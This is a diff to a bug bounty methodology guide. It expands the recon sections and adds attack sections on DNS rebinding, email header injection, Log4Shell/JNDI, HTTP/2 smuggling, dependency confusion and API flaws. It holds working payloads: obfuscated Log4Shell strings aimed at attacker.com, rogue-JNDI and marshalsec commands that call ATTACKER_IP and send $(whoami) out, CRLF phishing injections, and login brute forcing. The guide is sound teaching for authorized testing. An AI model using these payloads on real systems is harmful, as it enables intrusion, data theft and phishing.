@@ -380,6 +380,12 @@ Now that you've run through the basics, dive into the full methodology below. Ea
 | 4.34 | ↳ [Dangling Markup](#434-dangling-markup-injection) | CSP Bypass · Token Exfil · No JS Required |
 | 4.35 | ↳ [Expression Language Injection](#435-expression-language-injection-elspelognl) | SpEL · OGNL · Struts2 · Spring Cloud Gateway |
 | 4.36 | ↳ [XSLT Injection](#436-xslt-injection) | Processor RCE · document() SSRF · EXSLT Write |
+| 4.37 | ↳ [DNS Rebinding](#437-dns-rebinding-attacks) | SSRF Bypass · nip.io · rbndr.us · Low TTL |
+| 4.38 | ↳ [Email Header Injection](#438-email-header-injection) | CRLF · BCC Spoofing · Phishing from Legit Domain |
+| 4.39 | ↳ [JNDI Injection](#439-jndi-injection-log4shell--ldap) | Log4Shell · LDAP · RMI · Rogue Server Setup |
+| 4.40 | ↳ [HTTP/2 Attacks](#440-http2-specific-attacks) | HPACK Bomb · Stream Abuse · H2C Smuggling |
+| 4.41 | ↳ [Dependency Confusion](#441-dependency-confusion) | Supply Chain · Private Package Hijack · npm/PyPI |
+| 4.42 | ↳ [API Security Deep Dive](#442-api-security-deep-dive) | Mass Assignment · BOLA/BFLA · Rate Limits |
 | 5 | [Hunting Mindset](#5-hunting-mindset--methodology) | Strategy · Prioritization · Pivoting |
 | 6 | [POC Creation](#6-proof-of-concept-poc-creation) | Screenshots · Scripts · Automation · Evidence |
 | 7 | [Reporting](#7-reporting) | Professional Write-ups |
@@ -655,90 +661,198 @@ echo "Found $(wc -l < parameters_to_test.txt) URLs with parameters to test"
 
 ## **3. Advanced Enumeration Techniques**
 
-### **3.1 Parameter Discovery**
+> **&#x1F393; Beginner Note:** You now have live websites and URLs with parameters. This section finds HIDDEN parameters, directories, APIs, and cloud assets that aren't visible on the surface.
 
-**🛠️Tools:** [Arjun](https://github.com/s0md3v/Arjun), [ParamSpider](https://github.com/devanshbatham/ParamSpider), [FFuF](https://github.com/ffuf/ffuf)
+### **3.1 Parameter Discovery — Find Hidden Inputs**
 
-**Arjun Parameter Discovery**
+> Many web apps have undocumented parameters (debug=true, admin=1, internal=yes) that expose vulnerabilities.
+
+**&#x1F4E6; Quick Install**
 ```bash
-arjun -u "https://target.example.com" -m GET,POST --stable -o params.json
+go install github.com/ffuf/ffuf/v2@latest
+pip3 install arjun
 ```
 
-**ParamSpider Web Parameters**
+**Method 1: Look at what you already have**
 ```bash
-python3 paramspider.py --domain target.com --exclude woff,css,js --output paramspider_output.txt
+# You already collected parameterized URLs in Section 2
+cat parameters_to_test.txt | head -20
+# Example: https://target.com/page?cat=1&page=2&sort=asc
+# These parameters (?cat, ?page, ?sort) are your initial test targets
 ```
 
-**FFuF Parameter Bruteforce**
+**Method 2: Brute-force hidden parameters with ffuf**
 ```bash
-ffuf -u https://target.com/page.php?FUZZ=test -w /usr/share/wordlists/params.txt -o parameter_results.txt
+# Get a parameter wordlist first:
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt -O ~/params_wordlist.txt
+
+# Test: does the page respond to hidden parameters?
+ffuf -u "https://target.com/page.php?FUZZ=test" \
+  -w ~/params_wordlist.txt \
+  -mc 200 \
+  -fs 0 \
+  -o hidden_params.json
+
+# Expected: Finds parameters like ?debug=true, ?admin=1, ?show_source=1
 ```
 
-### **3.2 Cloud Asset Enumeration**
-
-**🛠️Tools:** [CloudEnum](https://github.com/initstring/cloud_enum), [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump), [S3Scanner](https://github.com/sa7mon/S3Scanner)
-
-**Cloud Bucket Enumeration**
+**Method 3: Arjun — automatic hidden parameter discovery**
 ```bash
-cloud_enum -k target.com -b buckets.txt -o cloud_enum_results.txt
+arjun -u "https://target.com/page.php" -m GET,POST --stable -o arjun_results.json
+# Expected output:
+# [+] Heuristic scanner found 3 parameters: id, page, debug
+# By default Arjun tests ~10,000 parameter names
 ```
 
-**S3 Bucket Access Test**
+**&#x1F4A1; Why hidden parameters matter:** `?debug=true` might show stack traces, `?admin=1` might grant privileges, `?file=index.php` might enable LFI.
+
+---
+
+### **3.2 Content Discovery — Find Hidden Files & Directories**
+
+> Brute-force common paths: /admin, /backup, /config, /.git, /wp-admin, /phpinfo.php
+
+**&#x1F4E6; Quick Install**
 ```bash
-aws s3 ls s3://<bucket_name> --no-sign-request
+curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash
+sudo mv feroxbuster /usr/local/bin/
+# Wordlist:
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -O ~/dirs_wordlist.txt
 ```
 
-**S3 Bucket Content Dump**
+**Feroxbuster — the fastest content discovery tool**
 ```bash
-python3 AWSBucketDump.py -b target-bucket -o dumped_data/
+feroxbuster -u https://target.com \
+  -w ~/dirs_wordlist.txt \
+  -r \                          # follow redirects
+  -t 20 \                        # 20 threads (don't go higher on production)
+  -x php,html,txt,bak,zip \     # try these extensions
+  -o ferox_results.json          # save results
+
+# Expected output:
+# 200      GET    /admin/
+# 200      GET    /phpinfo.php       ← GOLD
+# 200      GET    /backup.zip        ← GOLD
+# 200      GET    /config.php.bak    ← GOLD
+# 301      GET    /wp-admin/         ← WordPress!
+# 403      GET    /.git/             ← Git exposed!
 ```
 
-### **3.3 Content Discovery**
+**&#x2753; What to do with each find:**
+| Found | What to do |
+|---|---|
+| `/admin/` | Try default passwords (admin:admin, admin:password) |
+| `/phpinfo.php` | Check for sensitive env vars, disabled functions |
+| `/backup.zip` | Download it! Contains all source code |
+| `/.git/` | Use git-dumper to extract full codebase |
+| `/wp-admin/` | WordPress → check for known plugin vulns |
+| `/config.php.bak` | Contains database passwords |
+| `/phpmyadmin/` | Try root with no password |
 
-**🛠️Tools:** [Feroxbuster](https://github.com/epi052/feroxbuster), [FFuF](https://github.com/ffuf/ffuf), [Dirsearch](https://github.com/maurosoria/dirsearch)
+---
 
-**Feroxbuster**
+### **3.3 API Discovery — Find Hidden API Endpoints**
+
+> APIs often have less security than the main website. Find them, break them.
+
+**Method 1: Extract from JavaScript (no special tools)**
 ```bash
-feroxbuster -u https://target.com -w /usr/share/wordlists/common.txt -r -t 20 -o recursive_results.txt
+# JS files often contain API routes the frontend uses
+cat js_files.txt | while read js; do
+  curl -s "$js" | grep -oE '"/api/v[0-9]+/[a-zA-Z0-9_/\-]+"' | sed 's/"//g'
+done 2>/dev/null | sort -u > discovered_apis.txt
+
+echo "Found $(wc -l < discovered_apis.txt) API endpoints"
 ```
 
-**Dirsearch**
+**Method 2: Try common API paths**
 ```bash
-dirsearch -u https://target.com -w /usr/share/wordlists/content_discovery.txt -e php,html,js,json -x 404 -o dirsearch_results.txt
+# Check if common API paths exist on each subdomain
+cat live_urls.txt | while read url; do
+  for api_path in "api" "api/v1" "api/v2" "graphql" "swagger" "swagger-ui" "openapi.json" "docs" "rest" "soap"; do
+    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url/$api_path")
+    [ "$code" != "404" ] && echo "[$code] $url/$api_path"
+  done
+done
 ```
 
-**FFuF Recursive**
+**Method 3: Swagger/OpenAPI — auto-documentation exposed**
 ```bash
-ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/content_discovery.txt -mc 200,403 -recursion -recursion-depth 3 -o ffuf_results.txt
+# If you find /swagger or /api-docs → download the full API schema!
+curl -s https://api.target.com/swagger/v1/swagger.json | jq '.paths | keys'
+# This reveals EVERY endpoint, every parameter, every request body format
+
+curl -s https://target.com/api-docs/openapi.json | jq .
+# Same for OpenAPI 3.0
 ```
 
-### **3.4 API Enumeration**
+**&#x1F4A1; Beginner Tip:** If you find an API, test IDOR FIRST (Section 4.4). APIs are the #1 source of IDOR bugs for beginners.
 
-**🛠️Tools:** [Kiterunner](https://github.com/assetnote/kiterunner), [Postman](https://www.postman.com/), [Burp Suite](https://portswigger.net/burp)
+---
 
-**Kiterunner**
+### **3.4 Cloud Asset Enumeration — Find Exposed Buckets**
+
+> Companies often leave S3 buckets, Google Cloud Storage, and Azure blobs publicly readable.
+
+**AWS S3 — check if buckets exist**
 ```bash
-kr scan https://api.target.com -w /usr/share/kiterunner/routes-large.kite -o api_routes.txt
+# Common bucket naming patterns:
+# target.com, target-assets, target-prod, target-dev, target-backup
+aws s3 ls s3://target-assets --no-sign-request 2>/dev/null
+
+# If you DON'T have AWS CLI:
+curl -s https://target-assets.s3.amazonaws.com/ | head -20
+# 200 + XML listing = PUBLIC BUCKET! Start browsing.
+
+# Google Cloud Storage
+curl -s https://storage.googleapis.com/target-backup/ | head -20
+
+# Azure Blob
+curl -s https://target.blob.core.windows.net/ | head -20
 ```
 
-### **3.5 ASN Mapping**
+**&#x1F4A1; What to look for in public buckets:** Source code, database backups, credentials files (.env, config.json), user data, PII. If you find secrets → Critical finding.
 
-**🛠️Tools:** [Amass](https://github.com/OWASP/Amass), [Shodan](https://www.shodan.io/), [Censys](https://censys.io/)
+---
 
-**ASN Lookup**
+### **3.5 ASN & IP Mapping — Find Everything on the Network**
+
+> For large targets (big companies), find ALL IP ranges they own. Each IP might host a different application.
+
 ```bash
-amass intel -asn <ASN_Number> -o asn_ips.txt
+# Find ASN number for target company
+amass intel -org "Target Company Inc" -o org_info.txt
+# Expected: ASN 12345 — 1.2.3.0/24, 5.6.7.0/24
+
+# Find all IPs in their ASN range
+amass intel -asn 12345 -o asn_ips.txt
+
+# Check what's running on those IPs (use with CAUTION — port scanning is noisy)
+cat asn_ips.txt | httpx -silent -title -o ip_websites.txt
+# Finds web servers on non-standard IPs not linked to domains
 ```
 
-**Shodan Enumeration**
-```bash
-shodan search "net:<ip_range>" --fields ip_str,port --limit 100
+**&#x26A0; Caution:** Port scanning without permission is illegal in many jurisdictions. Only do this on targets with explicit bug bounty programs that allow it.
+
+---
+
+### **&#x1F4CB; Section 3 Summary — Your Recon Is Complete**
+
+At this point you should have:
+```
+~/bugbounty/target.com/
+├── subs.txt              # All subdomains
+├── live_urls.txt         # All live websites
+├── all_urls.txt          # All historical URLs
+├── js_files.txt          # All JavaScript files
+├── parameters_to_test.txt # URLs with parameters to test
+├── discovered_apis.txt   # Hidden API endpoints
+├── hidden_params.json    # Discovered hidden parameters
+├── ferox_results.json    # Discovered directories/files
+└── findings/             # Your vulnerability findings
 ```
 
-**Censys Asset Search**
-```bash
-censys search "autonomous_system.asn:<ASN_Number>" -o censys_assets.txt
-```
+**&#x1F680; You're ready to hunt.** Pick a promising URL from `parameters_to_test.txt` and start testing against the 42 vulnerability classes in Section 4.
 
 ---
 
@@ -3240,7 +3354,417 @@ public string exec() {
 
 <br>
 
-## **5. Hunting Mindset & Methodology**
+### **4.37 DNS Rebinding Attacks**
+
+> Bypass SSRF hostname validation by making DNS resolve to an allowed IP, then switch to a forbidden one.
+
+**How It Works**
+```
+1. Attacker controls evil.com DNS → resolves to 1.2.3.4 (allowed external IP)
+2. Server validates: "evil.com → 1.2.3.4 → OK, not internal"
+3. Server sends request to evil.com  
+4. DNS TTL expires → attacker changes A record → 127.0.0.1
+5. Server re-resolves → sends request to 127.0.0.1 → SSRF achieved
+```
+
+**Attack Setup — nip.io / rbndr.us**
+```bash
+# Use nip.io (wildcard DNS service — always resolves to specified IP)
+# First: resolves to your server
+http://7f000001.127.0.0.1.nip.io:8080/    # actually 127.0.0.1
+http://make-169-254-169-254.rr.nu/        # rbndr.us rebinding
+http://A.127.0.0.1.1time.169.254.169.254.1times.rebind.network/
+
+# Custom — run your own rebinding DNS server
+# dnsrebind.py on attacker server
+# TTL = 1 second, alternates between external IP and 127.0.0.1
+```
+
+**Bypass Patterns**
+```bash
+# If server checks DNS ONCE:
+# → Any rebinding service works (nip.io, rbndr.us)
+
+# If server checks DNS on each hop:
+# → Use low TTL + race condition (send request immediately after resolution)
+# → Use HTTP redirect (first response: 302 → http://127.0.0.1)
+
+# If server blocks private IPs at HTTP level:
+# → DNS rebind to cloud metadata IP instead of 127.0.0.1
+http://7f000001.A.169.254.169.254.1time.169.254.169.254.1times.rebind.network/
+
+# If only specific hosts are in regex allow-list:
+# → Use allowed domain as rebinding target
+```
+
+**Impact**
+```bash
+# → SSRF to internal services that pass hostname checks
+# → Access cloud metadata (AWS/GCP/Azure) through IP-restricted APIs
+# → Exploit internal services (Redis, Memcached, Elasticsearch)
+```
+
+---
+
+### **4.38 Email Header Injection**
+
+> Inject into contact forms, registration emails, or notification systems to send emails to arbitrary recipients.
+
+**Detection — Inject CRLF into email fields**
+```bash
+# Name field in contact form:
+From: Attacker%0d%0aBcc:victim@company.com
+# → Email is BCC'd to victim
+
+# Subject field injection:
+Subject: Hello%0d%0aBcc:all_users@company.com
+
+# Reply-To header injection:
+Email: attacker@evil.com%0d%0aBcc:target@target.com
+```
+
+**Common Injection Points**
+```bash
+# Registration forms: name, email, username
+# Contact/support forms: name, subject, message
+# Password reset: email parameter
+# Newsletter signup: email field
+# Order confirmation: shipping name, address
+# Invite/send-to-friend forms
+```
+
+**Exploitation Payloads**
+```bash
+# Add BCC
+%0d%0aBcc:victim@target.com
+
+# Add CC
+%0d%0aCc:victim@target.com
+
+# Change Subject
+%0d%0aSubject:New%20Malicious%20Subject
+
+# Add attachment (MIME)
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Phishing Content</h1>
+
+# Full email hijack
+attacker@evil.com%0d%0aTo:victim@target.com%0d%0aSubject:Hacked%0d%0a%0d%0aPhishing%20body
+
+# Multiple recipients
+%0d%0aBcc:user1@target.com,%20user2@target.com,%20admin@target.com
+```
+
+**Testing**
+```bash
+# Use Burp Collaborator to confirm
+# Inject: %0d%0aBcc:YOUR-COLLABORATOR.oastify.com
+# If you get an email → confirmed
+
+# Check email headers of received test emails
+# Look for injected headers in the raw source
+```
+
+**Impact**
+```bash
+# → Phishing from legitimate domain (SPF/DKIM pass!)
+# → Internal email spam
+# → Email spoofing — send as support@target.com
+# → Leak password reset tokens via BCC
+```
+
+---
+
+### **4.39 JNDI Injection (Log4Shell & LDAP)**
+
+> Java Naming and Directory Interface — when user input reaches JNDI lookup, remote code execution follows.
+
+**How It Works**
+```
+1. App uses: ctx.lookup(user_input)
+2. Attacker sends: ldap://attacker.com/evil
+3. Java connects to attacker's LDAP server
+4. Attacker's LDAP server responds with reference to malicious Java class
+5. Java downloads and executes the class → RCE
+```
+
+**Detection Payloads**
+```bash
+# Basic probe (DNS callback):
+${jndi:ldap://YOUR-COLLABORATOR.oastify.com/test}
+${jndi:dns://YOUR-COLLABORATOR.oastify.com/test}
+${jndi:rmi://YOUR-COLLABORATOR.oastify.com/test}
+
+# If DNS lookup appears in Collaborator → vulnerable!
+```
+
+**Log4Shell (CVE-2021-44228) — Specific Payloads**
+```bash
+# Basic RCE (Log4j 2.x < 2.15.0)
+${jndi:ldap://attacker.com/a}
+
+# Bypass WAF filters (Log4j)
+${${lower:j}ndi:ldap://attacker.com/a}
+${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://attacker.com/a}
+${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}
+
+# Obfuscation variants
+${${date:j}ndi:ldap://attacker.com/a}
+${${sys:java.vendor}_${lower:j}ndi:ldap://attacker.com/a}
+```
+
+**Setting Up Rogue JNDI Server**
+```bash
+# Use rogue-jndi or JNDIExploit
+git clone https://github.com/veracode-research/rogue-jndi
+cd rogue-jndi && mvn package -DskipTests
+
+# Start LDAP server
+java -jar target/RogueJndi-1.1.jar -c "curl http://YOUR-COLLABORATOR.oastify.com?x=$(whoami)" -n ATTACKER_IP
+
+# Payload: ${jndi:ldap://ATTACKER_IP:1389/o=reference}
+
+# Alternative: marshalsec
+git clone https://github.com/mbechler/marshalsec
+cd marshalsec && mvn package -DskipTests
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8000/#Exploit"
+```
+
+**Beyond Log4Shell — General JNDI Injection Points**
+```bash
+# Spring: @Value injection
+# Java EE: InitialContext.lookup()
+# LDAP auth bypass: (|(uid=*)(ou=*))
+# Any Java app using: new InitialContext().lookup(user_input)
+```
+
+---
+
+### **4.40 HTTP/2 Specific Attacks**
+
+> HTTP/2 multiplexing opens unique attack vectors not possible in HTTP/1.1.
+
+**HPACK Bomb — Compression-Based DoS**
+```bash
+# HPACK uses Huffman coding for header compression
+# Craft headers that compress to massive size when decoded
+# Single small request → server decompresses gigabytes
+
+# Tool: h2spec, h2load
+h2load -n 1 -m 1 -H 'x: AAAAAAAAAA...(10KB repeated)' https://target.com
+# Each compressed byte expands to many uncompressed bytes
+```
+
+**Stream Multiplexing Abuse**
+```bash
+# HTTP/2 sends multiple concurrent streams over one TCP connection
+# Attack: open streams that never complete → exhaust server stream limit
+
+# MAX_CONCURRENT_STREAMS bypass
+# Server advertises max 100 concurrent streams
+# Keep alives + slow reads → hold streams open indefinitely
+# Open new connection → bypass per-connection limit
+```
+
+**Stream Priority Manipulation**
+```bash
+# HTTP/2 has stream prioritization (weights 1-256)
+# Malicious client assigns priority to exhaust server resources
+# Low-priority streams starved, high-priority overloaded
+```
+
+**H2C Smuggling (HTTP/2 Cleartext)**
+```bash
+# Upgrade HTTP/1.1 → HTTP/2 over cleartext (h2c)
+GET / HTTP/1.1
+Host: target.com
+Upgrade: h2c
+HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
+
+# If backend supports h2c → create hidden HTTP/2 tunnel
+# Bypass frontend WAF that only inspects HTTP/1.1
+python3 h2csmuggler.py -x https://target.com https://INTERNAL_SERVICE/
+```
+
+**Pseudo-Header Injection**
+```bash
+# HTTP/2 uses pseudo-headers: :method, :path, :scheme, :authority
+# Inject pseudo-headers in HTTP/1.1 downgrade:
+:method GET
+:path /admin
+:authority internal.target.com
+Content-Length: 0
+
+# If not properly sanitized during downgrade → routing bypass
+```
+
+**Server-Side Request Forgery via :authority**
+```bash
+# Override :authority pseudo-header
+:authority 169.254.169.254
+:path /latest/meta-data/
+# → Request routed to AWS metadata service
+```
+
+---
+
+### **4.41 Dependency Confusion**
+
+> Supply chain attack: publish a malicious package with the same name as an internal private package.
+
+**How It Works**
+```
+1. Company uses private npm package: @company/internal-lib
+2. Package.json: "@company/internal-lib": "^1.0.0"  (no registry specified)
+3. Attacker publishes: internal-lib v99.0.0 to public npm
+4. npm install → resolves to attacker's v99.0.0 (higher version!)
+5. Malicious code executes during build/CI → RCE, secret exfiltration
+```
+
+**Detection — Find Internal Packages**
+```bash
+# Scan JS files for internal package names
+cat js_files.txt | while read js; do
+  curl -s "$js" | grep -oE '@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+' | sort -u
+done
+
+# Check package.json exposed on webroot
+curl -s https://target.com/package.json | jq '.dependencies, .devDependencies'
+
+# If dependencies show: "@company-name/private-lib" 
+# → Check if "private-lib" exists on npm → dependency confusion opportunity
+```
+
+**Exploitation (for authorized testing ONLY)**
+```bash
+# 1. Find an internal package name (from JS source maps, package.json, or error messages)
+# 2. Check if it's NOT published on public npm
+npm view @target/internal-tool  # should return 404
+
+# 3. Note: NEVER publish to public registries without explicit written authorization
+#    from the target organization. This affects the global npm ecosystem.
+#    Instead, document the finding with the package name + registry gap.
+```
+
+**Impact Documentation (for reports)**
+```bash
+# Finding: Dependency Confusion in @company/shared-utils
+# Evidence: Found in: https://target.com/assets/app.js line 4521
+#           import { auth } from '@company/shared-utils'
+#           Package '@company/shared-utils' is NOT published on npm
+#           → Attacker could publish malicious version
+# Impact: RCE in CI/CD pipeline, exfiltration of build secrets, backdoor in production
+```
+
+**Other Registries**
+```bash
+# npm: package.json dependencies
+# PyPI: requirements.txt, setup.py, Pipfile
+# RubyGems: Gemfile
+# Maven: pom.xml
+# NuGet: .csproj, packages.config
+# Docker: Dockerfile FROM lines
+# Go: go.mod
+```
+
+---
+
+### **4.42 API Security Deep Dive**
+
+> Beyond IDOR and auth bypass — the full API attack surface.
+
+**Mass Assignment**
+```bash
+# The server blindly binds JSON fields to object properties
+POST /api/user/register
+{"username":"test","password":"pass","role":"admin","isVerified":true,"credit":10000}
+# If role/admin/credit are accepted → mass assignment vulnerability
+
+# Detect: send extras fields in every API call, check response
+# If extra field appears in response → mass assignable
+```
+
+**BOLA (Broken Object Level Authorization)**
+```bash
+# Same as IDOR but specifically for API objects
+# User A's session accessing User B's resources
+GET /api/v1/users/2/profile    → 200 (as User A)
+GET /api/v1/orders/567/invoice → 200 (as User A, order owned by User B)
+
+# Test: access your own resource, note response structure
+#       change ID to another user's, compare responses
+#       If same structure returned → BOLA confirmed
+
+# Tip: Use two accounts, compare JWT/session, swap IDs
+```
+
+**BFLA (Broken Function Level Authorization)**
+```bash
+# Regular user accessing admin functions
+GET  /api/admin/users              → 403? Try these:
+POST /api/admin/users              → 200? (method different!)
+GET  /api/v2/admin/users           → 200? (API version matters!)
+GET  /api/Admin/users              → 200? (case sensitivity!)
+GET  /api/users?admin=true         → 200? (parameter override!)
+GET  /api/internal/users           → 200? (internal endpoint exposed!)
+
+# Hidden admin endpoints (check JS files)
+cat js_files.txt | grep -E "/admin|/internal|/staff|/management|/moderator"
+```
+
+**Rate Limiting Gaps**
+```bash
+# Login brute force — test with ffuf
+ffuf -u https://api.target.com/login -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@target.com","password":"FUZZ"}' \
+  -w /usr/share/wordlists/rockyou.txt \
+  -fc 401
+
+# Bypass via headers
+X-Forwarded-For: 127.0.0.{RANDOM}     # Unique IP per request
+X-Real-IP: {RANDOM_IP}               # Spoof origin
+# Bypass via API version
+/api/v1/endpoint → rate limited
+/api/v2/endpoint → NOT rate limited
+
+# Bypass via parameter
+/api/login → rate limited
+/api/login?debug=true → NOT rate limited
+```
+
+**Excessive Data Exposure**
+```bash
+# API returns more data than the UI shows
+GET /api/user/profile → full user object including:
+# {id, name, email, password_hash, ssn, credit_card, internal_notes, session_token}
+# Frontend only displays name and email → but ALL data is in the response!
+
+# Test: compare API response with what the UI shows
+#       If response has hidden fields → data exposure
+```
+
+**API Versioning Attacks**
+```bash
+# Old API versions may lack security fixes
+/api/v1/users → has auth   (current)
+/api/v0/users → NO auth    (deprecated, forgotten!)
+/api/beta/users → NO auth  (beta, never secured)
+
+# Find versions: JS files, response headers, API docs
+X-API-Version: 1.0
+```
+
+**Improper Assets Management**
+```bash
+# Old/staging/testing API hosts still exposed
+api-dev.target.com    → no auth
+api-staging.target.com → verbose errors, debug endpoints
+api-old.target.com    → vulnerable version
+api-v1.target.com     → deprecated, no security patches
+```
+
+---
 
 > *"Scanners find noise. Hunters find impact."*
 
